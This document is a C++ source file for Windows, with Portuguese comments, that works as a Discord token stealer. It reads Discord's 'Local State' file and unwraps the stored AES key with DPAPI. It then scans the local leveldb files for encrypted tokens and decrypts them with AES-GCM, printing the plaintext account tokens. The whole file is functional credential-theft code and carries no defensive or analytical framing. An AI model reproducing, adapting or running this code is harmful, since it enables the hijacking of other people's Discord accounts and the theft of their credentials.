#include <iostream>
#include <cstdlib>
#include <string>
#include <filesystem>
#include <fstream>
#include <vector>
#include <iomanip>
#include "json.hpp"
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;

std::string getENV();
std::string leveldbPATH();
void getFileList(const std::vector<BYTE>& chave);
std::string localState();
std::string base64_decode(const std::string& input);
std::vector<BYTE> dpapi_unprotect(const std::string& enc_without_prefix);
std::string desencriptar_valor(const std::string& token_base64, const std::vector<BYTE>& chave);

int main() {
    std::string key = localState();
    std::string decoded = base64_decode(key);

    // Remove prefixo "DPAPI" se presente
    if (decoded.substr(0, 5) == "DPAPI") {
        decoded = decoded.substr(5);
    }

    std::vector<BYTE> aes_key = dpapi_unprotect(decoded);
    if (aes_key.empty()) {
        std::cerr << "Unable to obtain the AES key.\n";
        return 1;
    }

    std::cout << "AES key (" << aes_key.size() << " bytes): ";
    for (BYTE b : aes_key) std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)b;
    std::cout << std::dec << "\n";

    getFileList(aes_key);

    return 0;
}

std::string getENV() {
    return std::getenv("APPDATA");
}

std::string leveldbPATH() {
    return getENV() + "\\discord\\Local Storage\\leveldb\\";
}

std::string base64_decode(const std::string& input) {
    DWORD decodedLen = 0;
    if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &decodedLen, nullptr, nullptr))
        return "";

    std::vector<BYTE> buffer(decodedLen);
    if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, buffer.data(), &decodedLen, nullptr, nullptr))
        return "";

    return std::string(buffer.begin(), buffer.end());
}

std::vector<BYTE> dpapi_unprotect(const std::string& enc_without_prefix) {
    DATA_BLOB inBlob{};
    inBlob.pbData = (BYTE*)enc_without_prefix.data();
    inBlob.cbData = (DWORD)enc_without_prefix.size();

    DATA_BLOB outBlob{};
    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        std::cerr << "CryptUnprotectData erro: " << GetLastError() << "\n";
        return {};
    }

    std::vector<BYTE> plain(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return plain;
}

std::string localState() {
    std::string localStatePath = getENV() + "\\discord\\Local State";

    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        std::cerr << "Error opening file: " << localStatePath << std::endl;
        return "";
    }

    json j;
    file >> j;

    if (j.contains("os_crypt") && j["os_crypt"].contains("encrypted_key")) {
        return j["os_crypt"]["encrypted_key"].get<std::string>();
    }

    return "";
}

void getFileList(const std::vector<BYTE>& chave) {
    std::string pathStr = leveldbPATH();
    fs::path leveldb(pathStr);

    if (!fs::exists(leveldb)) {
        std::cerr << "Directory does not exist: " << leveldb << "\n";
        return;
    }

    const std::string keyword = "dQw4w9WgXcQ";

    for (const auto& entry : fs::directory_iterator(leveldb)) {
        if (entry.path().extension() == ".ldb") {
            std::ifstream file(entry.path(), std::ios::binary);
            if (!file.is_open()) continue;

            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

            size_t pos = 0;
            while ((pos = content.find(keyword, pos)) != std::string::npos) {
                size_t end = content.find('"', pos);
                if (end != std::string::npos) {
                    std::string token = content.substr(pos, end - pos);
                    std::cout << "[TOKEN FOUND] " << token << std::endl;

                    // cortar o prefixo dQw4w9WgXcQ:
                    std::string base64_token;
                    size_t sep = token.find(':');
                    if (sep != std::string::npos) {
                        base64_token = token.substr(sep + 1);
                    }

                    std::string claro = desencriptar_valor(base64_token, chave);
                    if (!claro.empty()) {
                        std::cout << "[OK] Successfully decrypted: " << claro << "\n";
                    } else {
                        std::cout << "[FAIL] Could not decrypt.\n";
                    }
                }
                pos += keyword.size();
            }
        }
    }
}

std::string desencriptar_valor(const std::string& token_base64, const std::vector<BYTE>& chave) {
    std::string result;
    ULONG outLen = 0; 

    std::string blob = base64_decode(token_base64);
    if (blob.empty()) return result;

    if (blob.substr(0, 3) == "v10") {
        blob = blob.substr(3);
    }

    const size_t NONCE_LEN = 12, TAG_LEN = 16;
    if (blob.size() < NONCE_LEN + TAG_LEN) return result;

    const BYTE* nonce = reinterpret_cast<const BYTE*>(blob.data());
    const BYTE* ct = reinterpret_cast<const BYTE*>(blob.data() + NONCE_LEN);
    size_t ct_len = blob.size() - NONCE_LEN - TAG_LEN;
    const BYTE* tag = reinterpret_cast<const BYTE*>(blob.data() + NONCE_LEN + ct_len);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS s = 0;

    s = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (s != 0) goto cleanup;

    s = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          (ULONG)(wcslen(BCRYPT_CHAIN_MODE_GCM) * sizeof(wchar_t)), 0);
    if (s != 0) goto cleanup;

    s = BCryptGenerateSymmetricKey(hAlg, &hKey,
                                   nullptr, 0,
                                   const_cast<PUCHAR>(chave.data()),
                                   (ULONG)chave.size(), 0);
    if (s != 0) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ainfo;
    BCRYPT_INIT_AUTH_MODE_INFO(ainfo);
    ainfo.pbNonce = const_cast<PUCHAR>(nonce);
    ainfo.cbNonce = (ULONG)NONCE_LEN;
    ainfo.pbTag = const_cast<PUCHAR>(tag);
    ainfo.cbTag = (ULONG)TAG_LEN;

    s = BCryptDecrypt(hKey, const_cast<PUCHAR>(ct), (ULONG)ct_len,
                      &ainfo, nullptr, 0,
                      nullptr, 0, &outLen, 0);
    if (s != 0) goto cleanup;

    result.resize(outLen);
    s = BCryptDecrypt(hKey, const_cast<PUCHAR>(ct), (ULONG)ct_len,
                      &ainfo, nullptr, 0,
                      reinterpret_cast<PUCHAR>(&result[0]), outLen, &outLen, 0);
    if (s != 0) {
        result.clear();
        goto cleanup;
    }

    result.resize(outLen);

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}
